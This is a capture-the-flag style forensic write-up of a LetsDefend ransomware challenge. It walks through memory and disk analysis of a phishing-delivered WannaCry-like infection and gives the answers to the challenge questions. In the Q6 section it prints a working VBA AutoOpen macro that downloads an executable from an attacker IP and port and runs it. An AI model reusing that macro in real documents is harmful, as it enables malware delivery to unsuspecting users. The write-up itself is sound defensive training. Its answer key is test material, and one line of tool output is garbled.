+++
author = "MMOX "
title = "Let's Defend - Wanna Story"
date = "2023-03-06"
description = "Digital Forensic Memory Dump challenge Writeup "
tags = [
    "Lets defend",
    "Writeups",
    "Digital Forensics",
	"Mail analysis",
	"Ransomware"
]
categories = [
    "Writeups",
    "DFIR",
	"Malware Analysis",
	"Digital Forensics",
]

favorite= true
show_comments= true
showToc= true
Tocopen= false
draft= true
+++

![logo](/postImgs/letsdefend/wannastory/logo.jpg)


# Description
	
	MMOX Company GOT infected with a ransomware, as one of our new emplyees was not aware enough of the phising campains.
	Can you track what happend to answer the following Questions.

- required Tools:

	* [Volatilty 2 or 3 ](https://github.com/volatilityfoundation)
	* [OST Viewer](https://www.systoolsgroup.com/ost-viewer.html)
	* [OLEDUMP with PLUGIN_BIFF](https://blog.didierstevens.com/2021/02/12/quickpost-oledump-py-plugin_biff-py-remove-sheet-protection-from-spreadsheets/)
	
# Writeup

## Q1 
	
	1: What is the md5 hash of the desk and memory images?
	
this just a sanity check to make sure that you have the right images

` md5sum Wanna-Desk.ad1 Wanna-MEM.vmem`

![1](/postImgs/letsdefend/wannastory/1.png)


Answer: ||`54839173ec35223144d9a5ad393eb437_0891e428785566cb5772bdb45993d92b`||
	
## Q2

	2:What is the sutiable Volatilty profile for the memory Dump ? 
	
we will use volatility2 to get the profile 

	python2.7 vol.py -f Wanna-MEM.vmem imageinfo


![2](/postImgs/letsdefend/wannastory/2.png)

Answer: `Win10x64_19041`

## Q3
	
	3:When was the memory img captured ?  

with the same command as Q2 u will get the Time in the UTC format

![3](/postImgs/letsdefend/wannastory/3.png)

Answer: 2023-02-15 16:23:06

## Q4
	
	4:what is the attacker email address and the infected user email address ?

if we checked the running process we will find an process named outlook and from the challenge description we know it was a 
phising mail so to the desk image 
you will find the outlook mail saved in the local app data so by going there we will find a file named `atamer@mmox.lab.ost`

using OST viewer we can open it and in the most emails we will have the domain named @mmox.lab but there is only one that will have a slightly different email 

![4](/postImgs/letsdefend/wannastory/4.png)

Answer: hr@mm0x.lab_atamer@mmox.lab

## Q5
	
	5:what is the sha256 of the intial Access file file ?

In the email we Identfied in Q4 there is an attachment file named `RegistrationFormTemp.doc` 
just by saving it and using 
	
	sha256sum RegistrationFormTemp.doc

Answer: 12913f9984b8b5a940ef114579b831c0f361feb5f5618ccea11f5cb166a08c47

## Q6
	
	what is the IP and the port that the attacker used to deliver the Ransomware?

Using oledump over the file 
	
	oledump RegistrationFormTemp.doc
	
 you will get something like this 
 
![5](/postImgs/letsdefend/wannastory/5.png)

You can see that there’s “M” character (Macro) next to the 8th stream.
To Dump / Extract VBA Macro from the 8th stream, use
	
	oledump -s 8 --vbadecompressskipattributes RegistrationFormTemp.doc >macro.txt

just by opening the macro.txt file u will find 

```
Sub AutoOpen()
Set shell_obj = CreateObject("WScript.Shell")
 strFileURL = "http://192.168.30.50:8585/file.exe"
 strHDLocation = "C:\Users\Public\Documents\Thunder.exe"
 RUNCMD = "C:\Users\Public\Documents\Thunder.exe"
 
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
 objXMLHTTP.Open "GET", strFileURL, False
 objXMLHTTP.send
If objXMLHTTP.Status = 200 Then
 Set objADOStream = CreateObject("ADODB.Stream")
 objADOStream.Open
 objADOStream.Type = 1
objADOStream.Write objXMLHTTP.ResponseBody
 objADOStream.Position = 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
 If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
 Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
 objADOStream.Close
 Shell RUNCMD
 Set objADOStream = Nothing
 
 End If
Set objXMLHTTP = Nothing
 
End Sub
```
now we have the ip and the port

Answer: 192.168.30.50:8585

## Q7

	7: what is the pid of the 3 malious process that are related to the ransomware(Numerical order) ?

as by now we know what is the ransomware name on the device we will just run vol3 to get the pslist
and grep what's related to the malware process
	
	vol3 -f Wanna-MEM.vmem windows.pstree --pid 4296 | grep Thunder.exe -A 3
	
![6](/postImgs/letsdefend/wannastory/6.png)

just by ordering them in a numerical order you get the answer

Answer: 3780_4240_4296

## Q8

	8: what is the Bitcion address that will be used to pay the ransom?

this is an easy Question if you just opend any of the ransomware `@Please_Read_Me@.txt` that is on the Desk you will get the answer

Answer: 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94

## Q9 
	
	9: There is a suspicious file That the main malicious process dumps what is the files name and it's offset ?

we now the ransomware PID so by using the volatilty handles and grep the type named `File`
you will get the file name and offest 
	
	vol3 -f Wanna-MEM.vmem windows.handles --pid 4296 | grep 'File'
``` 
PID     Process     Offset          HandleValue Type    GrantedAccess   Name
4296ressThunder.exe 0xa20fe9310790an0x40 finFiled   0x100020    \Device\HarddiskVolume3\Windows
4296    Thunder.exe 0xa20fe933c9d0  0x104   File    0x100001    \Device\KsecDD
4296    Thunder.exe 0xa20fe93110f0  0x10c   File    0x100020    \Device\HarddiskVolume3\Users\Public\Documents
4296    Thunder.exe 0xa20fe933d650  0x14c   File    0x100003    \Device\KsecDD
4296    Thunder.exe 0xa20fe933ce80  0x164   File    0x100001    \Device\CNG
4296    Thunder.exe 0xa20fe9a409c0  0x1d0   File    0x120196    \Device\HarddiskVolume3
4296    Thunder.exe 0xa20fea3487d0  0x384   File    0x120196    \Device\HarddiskVolume3\Users\atamer\AppData\Local\Temp\hibsys.WNCRYT
```
Most programs will create temp files in a folder called C:\Users\AppData\Local\Temp that’s likely computer stores the majority of temporary files. In this case, hibsys.WNCRYT file was found and processing execution was handled by user name atamer.

Answer: 0xa20fea3487d0_hibsys.WNCRYT

## Q10

	10: There is 2 Mutants that the malware checks for to stop if it exist what are there names?
 
For this task all you need to find is the Mutant

	vol3 -f Wanna-MEM.vmem windows.handles --pid 4296 | grep 'Mutant'
```
4296    Thunder.exe 0xa20fe8ee2cd0  0x11c   Mutant  0x1f0001    MsWinZonesCacheCounterMutexA0
4296    Thunder.exe 0xa20fe8ee3d50  0x194   Mutant  0x1f0001    MsWinZonesCacheCounterMutexA
```
and now you have the 2 mutants
Answer : MsWinZonesCacheCounterMutexA0_MsWinZonesCacheCounterMutexA

and that's it Hope you enjoyed the Challenge See you in the next ones